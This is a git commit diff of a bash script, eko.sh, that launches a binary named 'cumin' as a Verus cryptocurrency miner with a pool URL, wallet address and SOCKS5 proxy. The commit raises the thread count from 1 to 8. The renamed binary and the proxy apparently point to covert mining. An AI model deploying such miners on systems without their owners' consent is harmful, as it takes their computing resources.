53c1d0a8225f9cf2d73a84041e6feb2d6290df92
squibex <90225595+squibex@users.noreply.github.com>
2021-12-14 19:32:20 -0800

    Update eko.sh

--- eko.sh
+++ eko.sh
@@ -1,8 +1,7 @@
 #!/bin/bash
-sudo apt install libjansson4 -y 
 chmod +x cumin
 POOL=stratum+tcp://verushash.asia.mine.zergpool.com:3300
 WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
 WORKER=prox
 PROXY=socks5://184.185.2.244:4145
-./cumin -a verus -o $POOL -u $WALLET -t 1 -p  c=VRSC,mc=VRSC,ID=zer
+./cumin -a verus -o $POOL -u $WALLET -t 8 -p  c=VRSC,mc=VRSC,ID=zer
